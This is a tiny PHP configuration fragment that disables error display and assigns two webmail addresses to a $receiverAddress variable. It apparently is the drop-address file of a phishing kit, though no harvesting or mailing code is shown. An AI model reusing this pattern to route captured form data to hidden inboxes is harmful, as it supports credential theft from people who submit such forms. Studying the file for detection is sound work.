<?php
ini_set('display_errors', 0);
$receiverAddress = "gineandjuice2018@gmail.com, gineandjuice2018@yandex.com

";


?>